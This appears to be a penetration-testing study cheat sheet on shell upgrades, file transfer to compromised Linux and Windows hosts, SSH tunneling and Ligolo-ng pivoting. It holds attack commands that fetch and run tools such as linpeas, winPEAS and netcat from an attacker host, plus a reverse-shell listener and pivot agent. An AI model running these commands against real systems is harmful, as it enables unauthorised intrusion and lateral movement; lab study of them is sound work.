# Tunneling, Pivoting & File Transfer

> Fill Weeks 25–26 (tunneling) and Week 3 Core Mechanics (file transfer).

## TTY Upgrade (Linux)
```
rlwrap nc -lvnp 443
python3 -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null   # fallback
# Ctrl+Z, then on Kali:
stty raw -echo; fg
# in restored shell:
reset xterm
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 columns 150
```

## File Transfer — Linux Target
```
python3 -m http.server 80               # on Kali
wget http://<KALI_IP>/linpeas.sh -O /dev/shm/linpeas.sh
curl http://<KALI_IP>/linpeas.sh -o /dev/shm/linpeas.sh
# base64 fallback if outbound blocked
base64 -w 0 binary_file                 # on Kali
echo "<B64>" | base64 -d > /tmp/f && chmod +x /tmp/f   # on target
```

## File Transfer — Windows Target
```
iwr -uri http://<KALI_IP>/winPEASx64.exe -Outfile C:\Windows\Tasks\winpeas.exe
certutil.exe -urlcache -split -f http://<KALI_IP>/nc64.exe C:\Windows\Tasks\nc64.exe
# SMB (most reliable, modern Win10/11/Server2022)
impacket-smbserver share $(pwd) -smb2support -username user -password pass   # Kali
net use Z: \\<KALI_IP>\share /user:user pass                                 # target
copy Z:\winPEASx64.exe C:\Windows\Tasks\winpeas.exe
```

## SSH Tunneling
```
ssh -L local_port:target:port user@pivot     # local fwd
ssh -D 1080 user@pivot                       # dynamic SOCKS
ssh -R remote_port:localhost:local_port user@pivot  # remote fwd
chisel ...
```

## Ligolo-ng (preferred — no proxychains slowdown)
```
# Kali
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# Pivot host
./agent.exe -connect <KALI_IP>:11601 -ignore-cert
# Kali — add route, start tunnel in console
sudo ip route add 172.16.50.0/24 dev ligolo
```
